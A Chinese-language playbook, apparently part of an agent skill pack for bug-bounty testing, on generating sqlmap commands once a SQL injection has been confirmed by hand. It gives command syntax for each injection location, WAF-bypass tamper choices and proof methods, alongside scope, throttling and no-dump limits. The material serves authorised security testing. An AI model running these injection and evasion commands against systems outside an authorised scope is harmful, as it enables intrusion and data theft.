# sqlmap 语法生成（手工确认差分后 → 最小伤害命令）

> 定位：注入点**已经手工打出差分**（条数变 / 内容变 / 稳定时间差），需要 sqlmap 固证、判边界、或受控抽数时，把请求**翻译成正确的 sqlmap 命令**。
> 不是探测器：未手工确认的口先回 `injection-test.md` 按栈选探针；**禁止**拿 sqlmap 当首发扫描器空喷。

## 0. 红线（先于一切语法）

- 本枪 OR+total / ES 流水全库：**不用** sqlmap `--dump` / `--os-shell` / `--risk=3`（injection-test 同款约束）；打挂集群不算证明。
- 默认 `--batch --risk=1 --level=1~3 --threads=1`；`--delay=1` 起步（对端弱或政府站 `--delay=3`）。
- `--dump` / `--dump-table` 只在用户当次点名要抽数时用；默认证明口径 = `--count`（条数）、`--dbs`/`--tables`（受控枚举）、`--technique=T` 延时固证。
- 写动作（`--os-shell`/`--sql-shell`/file 写）默认不做；半条链要跟先问用户。
- 目标必须在本任务授权范围内；命令留档进 `{短名}_dig/`（含时间与结果摘要）。

## 1. 基础骨架

```
sqlmap -u "<URL>" [位置参数] -p <参数> \
  --batch --level=3 --risk=1 --threads=1 --delay=1 --timeout=20 \
  --random-agent --flush-session --answers="follow=N,redirect=N"
```

- `-p` 只钉**手工出差分的那一个参**；不填 `-p` = level 内全参喷，禁止。
- `--technique` 能窄则窄：布尔 `B`、时间 `T`、报错 `E`、UNION `U`、堆叠 `S`。手工只验出时间差 → `--technique=T --time-sec=5`。
- 同站重复打加 `--flush-session`（避开结果缓存假阴性）；带会话加 `--cookie="k=v; k2=v2"`。

## 2. 按注入位置生成

| 位置 | 语法 |
|---|---|
| GET 查询参 | `-u "https://h/a?k=1&k2=2" -p k` |
| POST 表单 | `--data="a=1&b=2" -p a`（默认 application/x-www-form-urlencoded） |
| POST JSON | `--data='{"a":1,"b":{"c":2}}' --content-type="application/json" -p a`（嵌套写 `b.c`；老版本用 `-H "Content-Type: application/json"`） |
| Cookie | `--cookie="sid=abc*" -p` 不填（`*` 即注入点标记） |
| 任意 Header | `--headers="X-Forwarded-For: 1.2.3.4*\nX-Other: v"`（`*` 钉点，可多行 `\n` 连接） |
| UA / Referer | `--user-agent="mozilla*"` / `--referer="https://ref*"` |
| 整包复放（首选） | 抓包/浏览器复制原始 HTTP 报文存 `req.txt`（含方法、路径、Host、头、体），在注入点值后加 `*` → `sqlmap -r req.txt --batch`（自动带全头/全参，登录态接口最稳） |
| path 注入 | `-u "https://h/a/1*/b"`（路径段后加 `*`） |

**转换规则**：curl 复制来的请求 → 删第一行换 `-u`、`-H` 逐条搬、`-d` 搬 body；Burp/yakit 报文直接存文件走 `-r`。JSON 体优先 `-r` 整包，避免手工转义错。

## 3. WAF / 出数被拦 → tamper 按栈选

先看拦的是「空格」「等号」「大小写」「编码」哪一层，再选（可逗号叠 2 个）：

- 过滤空格：`space2comment`（`/**/`）；URL 解码层：`space2plus`
- 关键字大小写规则：`randomcase`；特征注释：`randomcomments`
- 过滤 `>` `=`：`between` / `equaltolike` / `greatest`
- 整体重编码：`charencode`（单次 URL）/ `chardoubleencode`（双层，代理先解一次的场景）
- MySQL + ModSecurity：`modsecurityversioned`；MSSQL 空格：`space2mssqlblank`
- 通用起手：`--tamper=space2comment,randomcase`，被拦再换，一次只改一层看差分

完整 tamper 细节见 `injection-test.md` 与现场 WAF；本包不附外部 tamper 矩阵文件。

## 4. 固证口径（替代 --dump 的写法）

```
# 条数证明（最小伤害首选）
--technique=BT -p k --count
# 结构证明
--dbs --count   /   -D <db> --tables
# 延时固证（对报错被吞的口）
--technique=T --time-sec=5 --threads=1
# 列名+首条样例（用户点名抽数才升级到这层）
-D <db> -T <table> --columns   →   --dump --start=1 --stop=3
```

报告引用：命令 + 回显关键行（`--count` 数字 / `[INFO] back-end DBMS` / 时间基线对比）贴进 `报告/` 验证过程段。

## 5. 执行环境

- 解释器优先：`python /home/lotso/artex-ymh/skills/src-method-pack/tools/sqlmap-flux/sqlmap.py`（包内尚未拷入时用 PATH 里的 `sqlmap` / `py -3 -m sqlmap`）。
- 与目标连接中断，可能需要 `--proxy=`（本机出网代理，地址自己填）。不要写死端口。`--tor` 仅目标封出口 IP 时。
- 断点续跑：同目标第二次会话自动续（`--output-dir` 保持一致）；`--flush-session` 才重测。

## 6. 何时不开本篇

- 没有任何手工差分 → 回 `injection-test.md`，本篇不开。
- 目标是 ES/Mongo/JSON 注入（非 SQL）→ sqlmap 不适用，按栈换探针。
- 只要证明「能出别人数据」且手工 payload 已够写报告 → 不必 sqlmap；本篇只在需要条数/边界/固证时开。
